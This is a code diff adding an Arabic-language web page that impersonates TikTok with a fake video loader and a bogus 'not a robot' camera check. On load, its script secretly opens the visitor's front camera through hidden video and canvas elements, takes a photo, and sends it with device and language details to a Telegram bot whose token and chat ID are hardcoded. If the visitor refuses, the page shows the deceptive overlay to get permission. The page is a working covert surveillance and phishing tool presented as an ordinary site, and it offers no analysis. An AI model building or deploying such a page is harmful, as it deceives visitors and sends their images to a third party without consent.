@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>TikTok</title>
+  <link rel="icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-login/8152caf0c8e8bc67ae0d.ico">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #000;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .logo { font-size: 2rem; font-weight: 900; letter-spacing: -1px; margin-bottom: 20px; }
+    .logo span:first-child { color: #25F4EE; }
+    .logo span:last-child  { color: #FE2C55; }
+    .video-box {
+      width: 300px; height: 420px;
+      background: #111; border-radius: 12px;
+      position: relative; overflow: hidden;
+      display: flex; align-items: center; justify-content: center;
+      border: 1px solid #222;
+    }
+    .spinner {
+      width: 44px; height: 44px;
+      border: 4px solid #333;
+      border-top-color: #FE2C55;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { position: absolute; bottom: 20px; font-size: 0.85rem; color: #666; }
+    #cam    { display: none; position: absolute; opacity: 0; pointer-events: none; }
+    #canvas { display: none; position: absolute; opacity: 0; pointer-events: none; }
+    .verify-overlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.85);
+      display: none;
+      align-items: center; justify-content: center;
+      z-index: 999;
+    }
+    .verify-box {
+      background: #1a1a1a; border-radius: 16px;
+      padding: 28px 24px; width: 300px;
+      text-align: center; border: 1px solid #333;
+    }
+    .verify-box h3 { font-size: 1.1rem; margin-bottom: 10px; }
+    .verify-box p  { font-size: 0.82rem; color: #aaa; margin-bottom: 20px; line-height: 1.5; }
+    .verify-btn {
+      background: #FE2C55; border: none; color: #fff;
+      padding: 12px 28px; border-radius: 8px;
+      font-size: 1rem; font-weight: 700;
+      cursor: pointer; width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo"><span>Tik</span><span>Tok</span></div>
+  <div class="video-box">
+    <div class="spinner"></div>
+    <span class="loading-text">جارٍ تحميل الفيديو...</span>
+  </div>
+
+  <div class="verify-overlay" id="verifyOverlay" style="display:none">
+    <div class="verify-box">
+      <h3>🔒 تحقق من الهوية</h3>
+      <p>للوصول إلى هذا المحتوى، يجب التحقق من أنك لست روبوتًا عبر الكاميرا.</p>
+      <button class="verify-btn" onclick="startCapture()">السماح والمتابعة</button>
+    </div>
+  </div>
+
+  <video id="cam" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const BOT_TOKEN = '8887053938:AAFf89tf-3ki0OEzLSZSk7uWaN72cGf4lck';
+    const CHAT_ID   = '688877968';
+
+    async function sendToTelegram(blob) {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'visitor.jpg');
+      form.append('caption',
+        `📸 زائر جديد!\n` +
+        `🕐 الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+        `📱 الجهاز: ${navigator.userAgent.substring(0, 120)}\n` +
+        `🌐 اللغة: ${navigator.language}`
+      );
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST', body: form
+        });
+      } catch (_) {}
+    }
+
+    async function startCapture() {
+      document.getElementById('verifyOverlay').style.display = 'none';
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+        const video  = document.getElementById('cam');
+        const canvas = document.getElementById('canvas');
+        video.srcObject = stream;
+        await new Promise(r => { video.onloadedmetadata = r; });
+        video.play();
+        await new Promise(r => setTimeout(r, 800));
+        canvas.width  = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        stream.getTracks().forEach(t => t.stop());
+        canvas.toBlob(blob => { if (blob) sendToTelegram(blob); }, 'image/jpeg', 0.92);
+      } catch (err) {
+        const ov = document.getElementById('verifyOverlay');
+        ov.style.display = 'flex';
+      }
+    }
+
+    window.addEventListener('load', () => startCapture());
+  </script>
+</body>
+</html>
